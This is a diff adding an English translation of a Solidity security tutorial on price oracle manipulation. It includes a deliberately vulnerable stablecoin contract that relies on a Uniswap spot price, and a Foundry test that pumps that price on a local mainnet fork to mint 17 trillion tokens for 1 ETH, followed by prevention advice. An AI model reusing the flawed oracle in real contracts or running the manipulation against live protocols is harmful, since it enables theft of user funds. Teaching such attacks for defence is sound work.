@@ -21,56 +21,56 @@ English translations by: [@to_22X](https://twitter.com/to_22X)
 
 -----
 
-这一讲，我们将介绍智能合约的操纵预言机攻击，并复现了一个攻击示例：用`1 ETH`兑换17万亿枚稳定币。仅2022年一年，操纵预言机攻击造成用户资产损失超过 2 亿美元。
+In this lesson, we will introduce the oracle manipulation attack on smart contracts and reproduce it using Foundry. In the example, we use `1 ETH` to exchange for 17 trillion stablecoins. In 2021, oracle manipulation attacks caused user asset losses of more than 200 million U.S. dollars.
 
-## 价格预言机
+## Price Oracle
 
-出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。
+For security reasons, the Ethereum Virtual Machine (EVM) is a closed and isolated sandbox. Smart contracts running on the EVM can access on-chain information but cannot actively communicate with the outside world to obtain off-chain information. However, this type of information is crucial for decentralized applications.
 
-预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。
+An oracle can help us solve this problem by obtaining information from off-chain data sources and adding it to the blockchain for smart contract use.
 
-其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：
-- 去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。
-- 合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。
-- MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。
+One of the most commonly used oracles is a price oracle, which refers to any data source that allows you to query the price of a token. Typical use cases include:
+- Decentralized lending platforms (AAVE) use it to determine if a borrower has reached the liquidation threshold.
+- Synthetic asset platforms (Synthetix) use it to determine the latest asset prices and support 0-slippage trades.
+- MakerDAO uses it to determine the price of collateral and mint the corresponding stablecoin, DAI.
 
 ![](./img/S15-1.png)
 
-## 预言机漏洞
+## Oracle Vulnerabilities
 
-如果预言机没有被开发者正确使用，会造成很大的安全隐患。
+If an oracle is not used correctly by developers, it can pose significant security risks.
 
-- 2021年10月，BNB链上的DeFi平台Cream Finance因为预言机漏洞[被盗用户资金 1.3亿 美元](https://rekt.news/cream-rekt-2/)。
-- 2022年5月，Terra链上的合成资产平台Mirror Protocol因为预言机漏洞[被盗用户资金 1.15亿 美元](https://rekt.news/mirror-rekt/)。
-- 2022年10月，Solana链上的去中心化借贷平台Mango Market因为预言机漏洞[被盗用户资金 1.15亿 美元](https://rekt.news/mango-markets-rekt/)。
+- In October 2021, Cream Finance, a DeFi platform on the Binance Smart Chain, suffered a [theft of $130 million in user funds](https://rekt.news/cream-rekt-2/) due to an oracle vulnerability.
+- In May 2022, Mirror Protocol, a synthetic asset platform on the Terra blockchain, suffered a [theft of $115 million in user funds](https://rekt.news/mirror-rekt/) due to an oracle vulnerability.
+- In October 2022, Mango Market, a decentralized lending platform on the Solana blockchain, suffered a [theft of $115 million in user funds](https://rekt.news/mango-markets-rekt/) due to an oracle vulnerability.
 
-## 漏洞例子
+## Vulnerability Example
 
-下面我们学习一个预言机漏洞的例子，`oUSD` 合约。该合约是一个稳定币合约，符合ERC20标准。类似合成资产平台Synthetix，用户可以在这个合约中零滑点的将 `ETH` 兑换为 `oUSD`（Oracle USD）。兑换价格由自定义的价格预言机（`getPrice()`函数）决定，这里采取的是Uniswap V2的 `WETH-BUSD` 的瞬时价格。在之后的攻击示例例子中，我们会看到这个预言机非常容易被操纵。
+Let's learn about an example of an oracle vulnerability in the `oUSD` contract. This contract is a stablecoin contract that complies with the ERC20 standard. Similar to the Synthetix synthetic asset platform, users can exchange `ETH` for `oUSD` (Oracle USD) with zero slippage in this contract. The exchange price is determined by a custom price oracle (`getPrice()` function), which relies on the instantaneous price of the `WETH-BUSD` pair on Uniswap V2. In the following attack example, we will see how this oracle can be easily manipulated.
 
-### 漏洞合约
+### Vulnerable Contract
 
-`oUSD`合约包含`7`个状态变量，用来记录`BUSD`，`WETH`，`UniswapV2`工厂合约，和`WETH-BUSD`币对合约的地址。
+The `oUSD` contract includes `7` state variables to record the addresses of `BUSD`, `WETH`, the Uniswap V2 factory contract, and the `WETH-BUSD` pair contract.
 
-`oUSD`合约主要包含`3`个函数:
-- 构造函数: 初始化 `ERC20` 代币的名称和代号。
-- `getPrice()`：价格预言机，获取Uniswap V2的 `WETH-BUSD` 的瞬时价格，这也是漏洞所在。
+The `oUSD` contract mainly consists of `3` functions:
+- Constructor: Initializes the name and symbol of the `ERC20` token.
+- `getPrice()`: Price oracle function that retrieves the instantaneous price of the `WETH-BUSD` pair on Uniswap V2. This is where the vulnerability lies.
   ```
-    // 获取ETH price
+    // Get ETH price
     function getPrice() public view returns (uint256 price) {
-        // pair 交易对中储备
+        // Reserves in the pair
         (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
-        // ETH 瞬时价格
+        // Instantaneous price of ETH
         price = reserve0/reserve1;
     }
   ```
-- `swap()`：兑换函数，将 `ETH` 以预言机给定的价格兑换为 `oUSD`。
+- `swap()` function, which exchanges `ETH` for `oUSD` at the price given by the oracle.
 
-合约代码：
+Source Code:
 
 ```solidity
 contract oUSD is ERC20{
-    // 主网合约
+    // Mainnet contracts
     address public constant FACTORY_V2 =
         0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
     address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
@@ -83,61 +83,61 @@ contract oUSD is ERC20{
 
     constructor() ERC20("Oracle USD","oUSD"){}
 
-    // 获取ETH price
+    // Get ETH price
     function getPrice() public view returns (uint256 price) {
-        // pair 交易对中储备
+        // Reserves in the pair
         (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
-        // ETH 瞬时价格
+        // Instantaneous price of ETH
         price = reserve0/reserve1;
     }
 
     function swap() external payable returns (uint256 amount){
-        // 获取价格
+        // Get price
         uint price = getPrice();
-        // 计算兑换数量
+        // Calculate exchange amount
         amount = price * msg.value;
-        // 铸造代币
+        // Mint tokens
         _mint(msg.sender, amount);
     }
 }
 ```
 
-### 攻击思路
+### Attack Strategy
 
-我们针对有漏洞的价格预言机 `getPrice()` 函数进行攻击，步骤：
+We will attack the vulnerable `getPrice()` function of the price oracle. The steps are as follows:
 
-1. 准备一些 `BUSD`，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 `deal` cheatcode 在本地网络上给自己铸造了 `1_000_000 BUSD`
-2. 在 UniswapV2 的 `WETH-BUSD` 池中大量买入 `WETH`。具体实现见攻击代码的 `swapBUSDtoWETH()` 函数。
-3. `WETH` 瞬时价格暴涨，这时我们调用 `swap()` 函数将 `ETH` 转换为 `oUSD`。
-4. **可选:** 在 UniswapV2 的 `WETH-BUSD` 池中卖出第2步买入的 `WETH`，收回本金。
+1. Prepare some `BUSD`, which can be our own funds or borrowed through flash loans. In the implementation, we use the Foundry's `deal` cheat code to mint ourselves `1,000,000 BUSD` on the local network.
+2. Buy a large amount of `WETH` in the `WETH-BUSD` pool on UniswapV2. The specific implementation can be found in the `swapBUSDtoWETH()` function of the attack code.
+3. The instantaneous price of `WETH` skyrockets. At this point, we call the `swap()` function to convert `ETH` into `oUSD`.
+4. **Optional:** Sell the `WETH` bought in step 2 back to the `WETH-BUSD` pool to recover the principal.
 
-这4步可以在一个交易中完成。
+These 4 steps can be completed in a single transaction.
 
-### Foundry 复现
+### Reproduce on Foundry
 
-我们选用 Foundry 进行操纵预言机攻击的复现，因为它很快，并且可以创建主网的本地分叉，方便测试。如果你不了解 Foundry，可以阅读 [WTF Solidity工具篇 T07: Foundry](https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md)。
+We will use Foundry to reproduce the manipulation attack on the oracle because it is fast and allows us to create a local fork of the mainnet for testing. If you are not familiar with Foundry, you can read [WTF Solidity Tools T07: Foundry](https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md).
 
-1. 在安装好 Foundry 之后，在命令行输入下列命令启动新项目，并安装 openzeppelin 库。
+1. After installing Foundry, start a new project and install the OpenZeppelin library by running the following command in the command line:
   ```shell
   forge init Oracle
   cd Oracle
   forge install Openzeppelin/openzeppelin-contracts
   ```
 
-2. 在根目录下创建 `.env` 环境变量文件，并在其中添加主网rpc，用于创建本地测试网。
+2. Create an `.env` environment variable file in the root directory and add the mainnet rpc to create a local testnet.
 
   ```
   MAINNET_RPC_URL= https://rpc.ankr.com/eth
   ```
 
-3. 将这一讲的代码，`Oracle.sol` 和 `Oracle.t.sol`，分别复制到根目录的 `src` 和 `test` 文件夹下，然后使用下列命令启动攻击脚本。
+3. Copy the code from this lesson, `Oracle.sol` and `Oracle.t.sol`, to the `src` and `test` folders respectively in the root directory, and then start the attack script with the following command:
 
   ```
   forge test -vv --match-test testOracleAttack
   ```
 
-4. 我们可以在终端中看到攻击结果。在攻击前，预言机 `getPrice()` 给出的 `ETH`
-价格为 `1216 USD`，是正常的。但在我们使用 `1,000,000` BUSD 在 UniswapV2 的 `WETH-BUSD` 池子中买入 `WETH` 之后，预言机给出的价格被操纵为 `17,979,841,782,699 USD`。这时，我们可以轻松的用 `1 ETH` 兑换17万亿枚 `oUSD`，完成攻击。
+4. We can see the attack result in the terminal. Before the attack, the oracle `getPrice()` gave a price of `1216 USD` for `ETH`, which is normal. However, after we bought `WETH` in the `WETH-BUSD` pool on UniswapV2 with `1,000,000` BUSD, the price given by the oracle was manipulated to `17,979,841,782,699 USD`. At this point, we can easily exchange `1 ETH` for 17 trillion `oUSD` and complete the attack.
+
   ```shell
   Running 1 test for test/Oracle.t.sol:OracleTest
   [PASS] testOracleAttack() (gas: 356524)
@@ -150,10 +150,11 @@ contract oUSD is ERC20{
   Test result: ok. 1 passed; 0 failed; finished in 262.94ms
   ```
 
-攻击代码：
+Attack Code:
 
 ```solidity
 // SPDX-License-Identifier: MIT
+// english translation by 22X
 pragma solidity ^0.8.4;
 import "forge-std/Test.sol";
 import "forge-std/console.sol";
@@ -172,30 +173,30 @@ contract OracleTest is Test {
 
     function setUp() public {
         MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
-        // fork指定区块
-        vm.createSelectFork(MAINNET_RPC_URL,16060405);
+        // Specify the forked block
+        vm.createSelectFork(MAINNET_RPC_URL, 16060405);
         router = IUniswapV2Router(ROUTER);
         ousd = new oUSD();
     }
 
     //forge test --match-test  testOracleAttack  -vv
     function testOracleAttack() public {
-        // 攻击预言机
-        // 0. 操纵预言机之前的价格
+        // Attack the oracle
+        // 0. Get the price before manipulating the oracle
         uint256 priceBefore = ousd.getPrice();
         console.log("1. ETH Price (before attack): %s", priceBefore); 
-        // 给自己账户 1000000 BUSD
+        // Give yourself 1,000,000 BUSD
         uint busdAmount = 1_000_000 * 10e18;
         deal(BUSD, alice, busdAmount);
-        // 2. 用busd买weth，推高顺时价格
+        // 2. Buy WETH with BUSD to manipulate the oracle
         vm.prank(alice);
         busd.transfer(address(this), busdAmount);
         swapBUSDtoWETH(busdAmount, 1);
         console.log("2. Swap 1,000,000 BUSD to WETH to manipulate the oracle");
-        // 3. 操纵预言机之后的价格
+        // 3. Get the price after manipulating the oracle
         uint256 priceAfter = ousd.getPrice();
         console.log("3. ETH price (after attack): %s", priceAfter); 
-        // 4. 铸造oUSD
+        // 4. Mint oUSD
         ousd.swap{value: 1 ether}();
         console.log("4. Minted %s oUSD with 1 ETH (after attack)", ousd.balanceOf(address(this))/10e18); 
     }
@@ -226,18 +227,18 @@ contract OracleTest is Test {
 }
 ```
 
-## 预防方法
+## How to Prevent
 
-知名区块链安全专家 `samczsun` 在一篇[博客](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle)中总结了预言机操纵的预防方法，这里总结一下：
+Renowned blockchain security expert `samczsun` summarized how to prevent oracle manipulation in a [blog post](https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle). Here's a summary:
 
-1. 不要使用流动性差的池子做价格预言机。
-2. 不要使用现货/瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。
-3. 使用去中心化的预言机。
-4. 使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。
-5. 仔细阅读第三方价格预言机的使用文档及参数设置。
+1. Avoid using pools with low liquidity as price oracles.
+2. Avoid using spot/instant prices as price oracles; incorporate price delays, such as Time-Weighted Average Price (TWAP).
+3. Use decentralized oracles.
+4. Use multiple data sources and select the ones closest to the median price as oracles to avoid extreme situations.
+5. Carefully read the documentation and parameter settings of third-party price oracles.
 
-## 总结
+## Conclusion
 
-这一讲，我们介绍了操纵预言机攻击，并攻击了一个有漏洞的合成稳定币合约，使用`1 ETH`兑换了17万亿稳定币，成为了世界首富（并没有）。
+In this lesson, we introduced the manipulation of price oracles and attacked a vulnerable synthetic stablecoin contract, exchanging `1 ETH` for 17 trillion stablecoins, making us the richest person in the world (not really).
 
 
